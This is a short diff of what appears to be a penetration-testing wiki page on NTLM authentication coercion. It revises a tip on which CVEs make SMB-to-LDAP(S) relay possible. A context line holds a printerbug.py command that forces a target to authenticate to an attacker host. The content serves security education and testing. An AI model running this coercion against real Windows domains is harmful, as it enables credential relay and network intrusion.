@@ -65,7 +65,8 @@ proxychains printerbug.py -no-pass 'DOMAIN'/'USER'@'TARGET' 'ATTACKER HOST'
 
 
 > [!TIP]
-> **Nota bene**: coerced NTLM authentications made over SMB restrict the possibilites of [NTLM relay](../ntlm/relay.md). For instance, an "unsigning cross-protocols relay attack" from SMB to LDAP will only be possible if the target is vulnerable to CVE-2025-54918.
+> [!TIP]
+> **Nota bene**: coerced NTLM authentications made over SMB restrict the possibilites of [NTLM relay](../ntlm/relay.md). For instance, an "unsigning cross-protocols relay attack" from SMB to LDAP(S) may only be possible if the target is vulnerable to MIC/LDAP authentication bypass issues such as CVE-2025-54918, CVE-2019-1040, or CVE-2019-1166.
 
 ## Resources
 
